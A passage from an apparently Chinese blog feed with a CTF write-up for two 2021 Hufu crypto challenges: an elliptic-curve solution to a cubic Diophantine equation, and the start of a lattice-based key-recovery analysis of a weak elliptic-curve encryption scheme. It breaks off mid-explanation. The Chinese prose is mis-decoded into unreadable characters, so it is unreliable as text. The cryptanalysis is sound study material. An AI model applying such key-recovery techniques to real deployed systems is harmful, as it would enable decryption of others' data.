&lt;p&gt;å•Šæ¯”èµ›çš„æ—¶å€™åˆšå¥½å’Œnpyå‡ºå»ç©äº†, ä¹Ÿæ²¡æ€ä¹ˆçœ‹é¢˜, å°±çœ‹äº†åŠä¸ªä¸‹åˆçš„Common prime rsa. ä¹Ÿæ²¡æ•´å‡ºæ¥.&lt;br&gt;æœ€è¿‘åˆåœ¨å¿™å­¦æ ¡çš„HW&lt;del&gt;å°±æ˜¯ä»€ä¹ˆæˆæœéƒ½æ²¡, åªèƒ½çœ‹ç€å¤§ä½¬å¹²è‡ªå·±åˆ’æ°´çš„é‚£ç§&lt;/del&gt;. æ‰€ä»¥é¢˜ç›®å¤ç°ä»€ä¹ˆçš„å°±æ…¢äº†å¥½å¤š.</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="RSA" scheme="http://tearsjin.github.io/tags/RSA/"/>
    
    <category term="Coppersmith" scheme="http://tearsjin.github.io/tags/Coppersmith/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2021è™ç¬¦</title>
    <link href="http://tearsjin.github.io/2021/04/06/writeup-for-2021%E8%99%8E%E7%AC%A6/"/>
    <id>http://tearsjin.github.io/2021/04/06/writeup-for-2021%E8%99%8E%E7%AC%A6/</id>
    <published>2021-04-06T09:29:21.000Z</published>
    <updated>2021-05-16T02:40:04.135Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å•Šå¤ªèœäº†å¤ªèœäº†â€¦æ‰“è¿™CTFä¹Ÿæœ‰åŠå¹´äº†,è¿˜æ˜¯è¿™ä¹ˆèœ,å¥½æƒ³æœ‰ä¸€æ¬¡èƒ½akå•Šâ€¦..<br>ä¸¤é“é¢˜ä¸€é¢˜æ‰‹å¿«æ‰¾åˆ°èµ„æ–™æ‹¿äº†ä¸ªä¸‰è¡€, å¦å¤–ä¸€é¢˜åšäº†åŠå¤©éƒ½æ²¡å‡ºæ¥, æœ‰æ¡å…³ç³»å¼ç†è§£é”™äº†çœŸçš„æƒ³é”¤äººâ€¦.</p></blockquote><h1 id="0x00-cubic"><a href="#0x00-cubic" class="headerlink" title="0x00 cubic"></a>0x00 cubic</h1><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction <span class="keyword">as</span> Frac</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_num</span>(<span class="params">prompt</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        num = <span class="built_in">int</span>(<span class="built_in">input</span>(prompt))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> num <span class="keyword">if</span> num &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;Please give me <span class="subst">&#123;N&#125;</span> pairs of positive integers (x,y,z) &quot;</span></span><br><span class="line">      <span class="string">f&quot;satisfying the equation `x/(y+z) + y/(z+x) + z/(x+y) = <span class="subst">&#123;N&#125;</span>`\n&quot;</span>)</span><br><span class="line">anss = []</span><br><span class="line">mark = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    x = read_num(<span class="string">&quot;[&gt;] x: &quot;</span>)</span><br><span class="line">    y = read_num(<span class="string">&quot;[&gt;] y: &quot;</span>)</span><br><span class="line">    z = read_num(<span class="string">&quot;[&gt;] z: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> x * y * z == <span class="number">0</span>: <span class="comment"># positive integer</span></span><br><span class="line">        mark = <span class="number">1</span></span><br><span class="line">        print(<span class="string">&quot;This is not what i want!\n&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> reduce(gcd, [x, y, z]) != <span class="number">1</span>: <span class="comment"># (kx, ky, kz)</span></span><br><span class="line">        mark = <span class="number">1</span></span><br><span class="line">        print(<span class="string">&quot;This is not what i want!\n&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> Frac(x, y+z) + Frac(y, z+x) + Frac(z, x+y) != N:</span><br><span class="line">        mark = <span class="number">1</span></span><br><span class="line">        print(<span class="string">&quot;This is not what i want!\n&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    ans = <span class="built_in">tuple</span>(<span class="built_in">sorted</span>([x, y, z])) <span class="comment"># (y, x, z)</span></span><br><span class="line">    <span class="keyword">if</span> ans <span class="keyword">in</span> anss:</span><br><span class="line">        mark = <span class="number">1</span></span><br><span class="line">        print(<span class="string">&quot;This is not what i want!\n&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;You are right!\n&quot;</span>)</span><br><span class="line">        anss.append(ans)</span><br><span class="line"><span class="keyword">if</span> mark == <span class="number">0</span>:</span><br><span class="line">    flag = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    print(<span class="string">&quot;flag is: &quot;</span> + flag + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;Something wrong!\n&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>æ‰¾åˆ°6ç»„$a,b,c$æ»¡è¶³:<br>$$<br>{a \over b+c}+{b \over a+c}+{c \over a+b} = 6<br>$$<br>è¿™é¢˜æ‹¿åˆ°å°±ç›´æ¥å»æœäº†, æ²¡æƒ³åˆ°ç›´æ¥å‡ºæ¥ä¸€ç¯‡<a href="https://zhuanlan.zhihu.com/p/33853851">çŸ¥ä¹çš„æ–‡ç« </a>, çœ‹å®Œä¹‹åæ‰çŸ¥é“åŸæ¥æ˜¯æ¤­åœ†æ›²çº¿â€¦.<br>åŸç†ä»€ä¹ˆçš„é‡Œé¢è®²çš„å¾ˆæ¸…æ¥šäº†, è¿™è¾¹å°±ä¸å†è¯´äº†, åªæ˜¯ä¸­é—´æœ‰ä¸€ä¸ªåŒ–å¼å­ä¸ºç»´å°”æ–¯ç‰¹æ‹‰æ–¯å½¢å¼çš„è¿‡ç¨‹, æˆ‘æ˜¯è¯¯æ‰“è¯¯æ’å¼„æˆçš„(å› ä¸ºå…¬å¼æ˜¯åŒä¸€ä¸ª, ç›´æ¥æ”¹ä¸€ä¸‹çŸ¥ä¹é‡Œçš„å°±è¡Œäº†), åæ¥æ‰¾åˆ°äº†paper - &gt; <strong>An unusual cubic representation problem</strong>, æ‰æ‰¾åˆ°å…·ä½“çš„å…¬å¼<br>$$<br>a={8(N+3)-x+y \over 2(N+3)(4-x)} \\<br>b={8(N+3)-x-y \over 2(N+3)(4-x)} \\<br>c={-4(N+3)-x(N+2) \over (N+3)(4-x)}<br>$$<br>è¿™é‡Œçš„$N = 6$<br>æœ‰äº†è¿™ä¸ªæˆ‘ä»¬å°±èƒ½æŠŠå¼å­åŒ–æˆ$y^2 = ax^3 + bx^2+cx$çš„å½¢å¼äº†, è¿™é‡Œåˆæœ‰ä¸ªé—®é¢˜, è¯¥æ€ä¹ˆåˆ©ç”¨ä¸Šé¢çš„å¼å­å¿«é€ŸåŒ–æˆæˆ‘ä»¬è¦çš„å½¢å¼å‘¢<del>å½“ç„¶æ˜¯æ‹¿è‰ç¨¿çº¸ç®—å•¦</del></p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨sageçš„è§£æ–¹ç¨‹, è§£å‡ºè¿™ä¸ªå…³ç³»å¼æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a,b,c,x,y = var(<span class="string">&#x27;a&#x27;</span>),var(<span class="string">&#x27;b&#x27;</span>),var(<span class="string">&#x27;c&#x27;</span>),var(<span class="string">&#x27;x&#x27;</span>),var(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">N = <span class="number">6</span></span><br><span class="line">a=(<span class="number">8</span>*(N+<span class="number">3</span>)-x+y)/(<span class="number">2</span>*(N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">b=(<span class="number">8</span>*(N+<span class="number">3</span>)-x-y)/(<span class="number">2</span>*(N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">c=(-<span class="number">4</span>*(N+<span class="number">3</span>)-(N+<span class="number">2</span>)*x)/((N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">f = a^<span class="number">3</span> + b^<span class="number">3</span> +c^<span class="number">3</span> - <span class="number">9</span>*a*b*c - <span class="number">5</span>*(a^<span class="number">2</span>*b+a^<span class="number">2</span>*c+b^<span class="number">2</span>*a+b^<span class="number">2</span>*c+c^<span class="number">2</span>*a+c^<span class="number">2</span>*b)</span><br><span class="line">print(f.solve(y)[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># y == -sqrt(x^3 + 213*x^2 + 288*x)</span></span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨è§£å‡ºæ¥çš„å‚æ•°è·Ÿç€çŸ¥ä¹ä¸Šçš„å†…å®¹å†™ä»£ç å°±è¡Œäº†, è¦çŸ¥é“åŸç†å°±å»çŸ¥ä¹çœ‹å§, é“¾æ¥ä¹Ÿåœ¨ä¸Šé¢äº†</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">a,b,c,x,y = var(<span class="string">&#x27;a&#x27;</span>),var(<span class="string">&#x27;b&#x27;</span>),var(<span class="string">&#x27;c&#x27;</span>),var(<span class="string">&#x27;x&#x27;</span>),var(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">N = <span class="number">6</span></span><br><span class="line">a=(<span class="number">8</span>*(N+<span class="number">3</span>)-x+y)/(<span class="number">2</span>*(N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">b=(<span class="number">8</span>*(N+<span class="number">3</span>)-x-y)/(<span class="number">2</span>*(N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">c=(-<span class="number">4</span>*(N+<span class="number">3</span>)-(N+<span class="number">2</span>)*x)/((N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">f = a^<span class="number">3</span> + b^<span class="number">3</span> +c^<span class="number">3</span> - <span class="number">9</span>*a*b*c - <span class="number">5</span>*(a^<span class="number">2</span>*b+a^<span class="number">2</span>*c+b^<span class="number">2</span>*a+b^<span class="number">2</span>*c+c^<span class="number">2</span>*a+c^<span class="number">2</span>*b)</span><br><span class="line">print(f.solve(y)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ee=EllipticCurve([<span class="number">0</span>,<span class="number">213</span>,<span class="number">0</span>,<span class="number">288</span>,<span class="number">0</span>])</span><br><span class="line">P = ee(-<span class="number">200</span>,<span class="number">680</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">return</span> num <span class="keyword">if</span> num &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">orig</span>(<span class="params">P,N</span>):</span></span><br><span class="line">    x=P[<span class="number">0</span>]</span><br><span class="line">    y=P[<span class="number">1</span>]</span><br><span class="line">    a=(<span class="number">8</span>*(N+<span class="number">3</span>)-x+y)/(<span class="number">2</span>*(N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">    b=(<span class="number">8</span>*(N+<span class="number">3</span>)-x-y)/(<span class="number">2</span>*(N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">    c=(-<span class="number">4</span>*(N+<span class="number">3</span>)-(N+<span class="number">2</span>)*x)/((N+<span class="number">3</span>)*(<span class="number">4</span>-x))</span><br><span class="line">    da=denominator(a)</span><br><span class="line">    db=denominator(b)</span><br><span class="line">    dc=denominator(c)</span><br><span class="line">    l=lcm(da,lcm(db,dc))</span><br><span class="line">    <span class="keyword">return</span> [a*l,b*l,c*l]</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line">arr = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    res = orig(i*P,<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">if</span> check(j) == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        arr.append(res)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(arr) == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">arr</span><br></pre></td></tr></table></figure><h1 id="0x01-simultaneous"><a href="#0x01-simultaneous" class="headerlink" title="0x01 simultaneous"></a>0x01 simultaneous</h1><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m, e, n</span>):</span></span><br><span class="line">    n = <span class="built_in">int</span>(n)</span><br><span class="line">    size = n.bit_length() // <span class="number">2</span></span><br><span class="line">    m_low = m &amp; ((<span class="number">1</span> &lt;&lt; size) - <span class="number">1</span>)</span><br><span class="line">    m_high = (m &gt;&gt; size)</span><br><span class="line"></span><br><span class="line">    b = (m_low**<span class="number">2</span> - m_high**<span class="number">3</span>) % n</span><br><span class="line">    EC = EllipticCurve(Zmod(n), [<span class="number">0</span>, b])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (EC((m_high, m_low)) * e).xy()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c, d, n</span>):</span></span><br><span class="line">    n = <span class="built_in">int</span>(n)</span><br><span class="line">    size = n.bit_length() // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    c_high, c_low = c</span><br><span class="line">    b = (c_low**<span class="number">2</span> - c_high**<span class="number">3</span>) % n</span><br><span class="line">    EC = EllipticCurve(Zmod(n), [<span class="number">0</span>, b])</span><br><span class="line">    m_high, m_low = (EC((c_high, c_low)) * d).xy()</span><br><span class="line">    m_high, m_low = <span class="built_in">int</span>(m_high), <span class="built_in">int</span>(m_low)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (m_high &lt;&lt; size) | m_low</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">size</span>):</span></span><br><span class="line">    p = random_prime(<span class="number">1</span> &lt;&lt; size, lbound=<span class="number">1</span> &lt;&lt; (size-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">while</span> p % <span class="number">3</span> != <span class="number">2</span>:</span><br><span class="line">        p = random_prime(<span class="number">1</span> &lt;&lt; size, lbound=<span class="number">1</span> &lt;&lt; (size-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    q = random_prime(<span class="number">1</span> &lt;&lt; size, lbound=<span class="number">1</span> &lt;&lt; (size-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">while</span> q % <span class="number">3</span> != <span class="number">2</span>:</span><br><span class="line">        q = random_prime(<span class="number">1</span> &lt;&lt; size, lbound=<span class="number">1</span> &lt;&lt; (size-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> q &gt; p:</span><br><span class="line">        p, q = q, p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ZZ(p), ZZ(q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SIZE = <span class="number">512</span></span><br><span class="line">HINTSIZE = <span class="number">96</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">42</span></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">masks = [randint(<span class="number">1</span> &lt;&lt; (SIZE-<span class="number">1</span>), <span class="number">1</span> &lt;&lt; SIZE) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] <span class="comment"># 2^512 bits ä¸‰ä¸ª</span></span><br><span class="line">masked_flag = reduce(<span class="keyword">lambda</span> a, b: a ^^ b, masks, flag) <span class="comment"># å››ä¸ªä¸€èµ·å¼‚æˆ–</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">ciphertexts = []</span><br><span class="line">x = random_prime(floor((<span class="number">1</span>&lt;&lt;(<span class="number">2</span>*SIZE-<span class="number">2</span>))**<span class="number">0.373</span>), proof=<span class="literal">False</span>) </span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p, q = gen_prime(SIZE)</span><br><span class="line">        n = p * q</span><br><span class="line"></span><br><span class="line">        y = random_prime(floor(n**<span class="number">0.373</span>), proof=<span class="literal">False</span>)</span><br><span class="line">        zbound = -<span class="number">1</span> * <span class="built_in">int</span>(((p-q) * <span class="built_in">round</span>(n ** <span class="number">0.25</span>) * y) // (<span class="number">3</span> * (p + q)))</span><br><span class="line"></span><br><span class="line">        z_ = zbound + ((p + <span class="number">1</span>)*(q + <span class="number">1</span>)*y - zbound) % x</span><br><span class="line">        e = ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y - z_) // x</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> (e*x - y*(p+<span class="number">1</span>)*(q+<span class="number">1</span>) == -z_)</span><br><span class="line">        <span class="keyword">assert</span> (<span class="built_in">abs</span>(z_) &lt; <span class="built_in">abs</span>(zbound))</span><br><span class="line">        <span class="keyword">assert</span> (gcd(x, y) == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        d = inverse_mod(e, (p+<span class="number">1</span>)*(q+<span class="number">1</span>))</span><br><span class="line">        c = encrypt(masks[count], e, n)</span><br><span class="line">        <span class="keyword">assert</span> decrypt(c, d, n) == masks[count]</span><br><span class="line"></span><br><span class="line">        ciphertexts.append(&#123;</span><br><span class="line">            <span class="string">&quot;n&quot;</span>: n,</span><br><span class="line">            <span class="string">&quot;e&quot;</span>: e,</span><br><span class="line">            <span class="string">&quot;c&quot;</span>: c,</span><br><span class="line">            <span class="string">&quot;hint&quot;</span>: p &amp; ((<span class="number">1</span>&lt;&lt;HINTSIZE)-<span class="number">1</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;masked_flag = &quot;</span>, masked_flag)</span><br><span class="line">print(<span class="string">&quot;ciphertexts = &quot;</span>, ciphertexts)</span><br></pre></td></tr></table></figure><h2 id="analyses-1"><a href="#analyses-1" class="headerlink" title="analyses"></a>analyses</h2><p>ç”¨çš„ECCåŠ å¯†äº†ä¸‰ä¸ª<code>masked_flag</code>, ä½†åŸºæœ¬ä¸Šæ²¡åŠæ³•ä»ECCä¸Šå…¥æ‰‹. å›æ¥çœ‹å‰é¢çš„å¯†é’¥ç”Ÿæˆ.</p><p>è¿™é‡Œæ¯ä¸€è½®çš„ç§é’¥éƒ½æ˜¯ä¸åŒçš„, æ¯ä¸€è½®éƒ½éšæœºç”Ÿæˆç´ æ•°<code>y</code>, å¹¶åˆ©ç”¨<code>x,y</code>ä¸¤ä¸ªç´ æ•°ç”Ÿæˆä¸€ä¸ªå…¬é’¥<code>e</code></p><p>å› ä¸ºæ¯è½®ç”¨çš„<code>x</code>éƒ½æ˜¯ç›¸åŒçš„, è€Œä¸”æˆ‘ä»¬æœ‰å…³ç³»å¼:<br>$$<br>\begin{cases}<br>e_1 x = y_1(p_1+1)(q_1+1) - z_1 \\<br>e_2 x = y_2(p_2+1)(q_2+1) - z_2 \\<br>e_3 x = y_3(p_3+1)(q_3+1) - z_1<br>\end{cases}<br>$$<br>åŒ–ç®€ä¸€ä¸‹å¯ä»¥æœ‰:<br>$$<br>\begin{cases}<br>e_1 x -y_1n_1 = y_1(p_1+q_1+1) - z_1 \\<br>e_2 x -y_2n_2 = y_2(p_2+q_2+1) - z_2 \\<br>e_3 x -y_3n_3 = y_3(p_3+q_3+1) - z_3<br>\end{cases}<br>$$<br>è®°$y_i(p_i+q_i+1) - z_i$ä¸º$s_i$, å¯ä»¥é€ å‡ºè¿™ä¸ªä¸€ä¸ªæ ¼å­<br>$$<br>(x,y_1,y_2,y_3)<br>\begin{pmatrix}<br>\sqrt n&amp;e_1&amp;e_2&amp;e_3 \\<br>0&amp;-n_1&amp;0&amp;0 \\<br>0&amp;0&amp;-n_2&amp;0 \\<br>0&amp;0&amp;0&amp;-n_3 \\<br>\end{pmatrix}<br>=<br>(\sqrt nx,s_1,s_2,s_3)<br>$$<br>è¿™é‡Œçš„$x$å’Œ$y$éƒ½å¤Ÿå°, è¶³å¤Ÿè§„çº¦å‡ºç»“æœæ¥.<br>è§„çº¦å‡º$(\sqrt nx,s_1,s_2,s_3)$å¯ä»¥æ±‚å‡º$x$å’Œ$y$</p><p>å½“æ—¶åšåˆ°è¿™é‡Œ, è¢«è¶…å¤§çš„$z$å¡ä½äº†, åšäº†ä¸€ä¸‹åˆéƒ½æ²¡æœ‰æƒ³å‡ºè¯¥æ€ä¹ˆç”¨<code>Hint,x,y</code>æŠŠ<code>p</code>æå‡ºæ¥. (<code>zbound</code>æœ‰å…³çš„å¼å­è¢«æˆ‘å¼„é”™äº†!! æ²¡æœ‰æƒ³åˆ°è¿™ä¸ª<code>zbound</code>è™½ç„¶è¢«æ¶ˆå»ä½†è¿˜æ˜¯æœ‰ä½œç”¨çš„!)</p><p>æ¯”èµ›ç»“æŸä»¥åd33å¸ˆå‚…å‘äº†ä¸€ç¯‡<a href="https://eprint.iacr.org/2014/549.pdf">paper</a>, ä½†æ˜¯ä¸èƒ½ç›´æ¥ç”¨é‡Œé¢çš„æ–¹æ³•æ±‚,(ç•Œå¡çš„å¤ªæ­»äº†?) è¯´æ˜¯è¦åˆ©ç”¨coppersmithçš„å§¿åŠ¿å’Œ<code>hint</code>ä¸€ç‚¹ä¸€ç‚¹çš„æŠŠpæ•´å‡ºæ¥. çœ‹äº†ä¸€å¤©copperä¹Ÿæ²¡å•¥ç»“æœ, åªèƒ½ç­‰wpäº†. å‡ºæ¥äº†å†å¥½å¥½çœ‹çœ‹åˆ°åº•è¯¥æ€ä¹ˆè°ƒcoppersmith</p><p>åæ¥ç¿»è™ç¬¦wpç¿»åˆ°ä¸€ç¯‡<a href="http://wh1sper.com/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/,">wp</a>é‡Œé¢æœ‰ä¸€ä¸ªäºŒåˆ†æ³•çš„æ–¹æ³•, çœ‹å®Œæ‰å‘ç°åŸæ¥è‡ªå·±ä¸€ç›´æŠŠ<code>zbound</code>çš„å¼å­æé”™äº†â€¦ ä¸è¿‡å°±ç®—æ²¡æé”™è‡ªå·±ä¹Ÿå¯èƒ½æƒ³ä¸åˆ°é‚£ä¸ªæ„é€ æ–¹ç¨‹çš„æ–¹æ³•, è™½ç„¶é‚£ä¸ªæ–¹æ³•ä¸ç®—ç‰¹åˆ«å¤æ‚, ä¹Ÿç®—æ˜¯å¥½å¥½å­¦ä¹ äº†ä¸€æ³¢</p><h3 id="å‚è€ƒè¿™é‡Œçš„äºŒåˆ†æ³•"><a href="#å‚è€ƒè¿™é‡Œçš„äºŒåˆ†æ³•" class="headerlink" title="å‚è€ƒè¿™é‡Œçš„äºŒåˆ†æ³•"></a>å‚è€ƒ<a href="http://wh1sper.com/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/">è¿™é‡Œ</a>çš„äºŒåˆ†æ³•</h3><p>å…ˆæ¥çœ‹ä¸€ä¸‹ç”Ÿæˆ$zbound$å’Œ$z$çš„ç­‰å¼<br>$$<br>zbound = \lfloor {(p-q)\cdot \lfloor n^{1\over 4}\rceil \cdot y \over 3(p+q)} \rceil \\<br>z = zbound + (y(p+1)(q+1) - zbound \mod x)<br>$$<br>è¿™é‡Œæˆ‘ä¸€å¼€å§‹åšçš„æ—¶å€™å¿½ç•¥äº†ä¸€ä¸ªç»†èŠ‚, $y(p+1)(q+1) 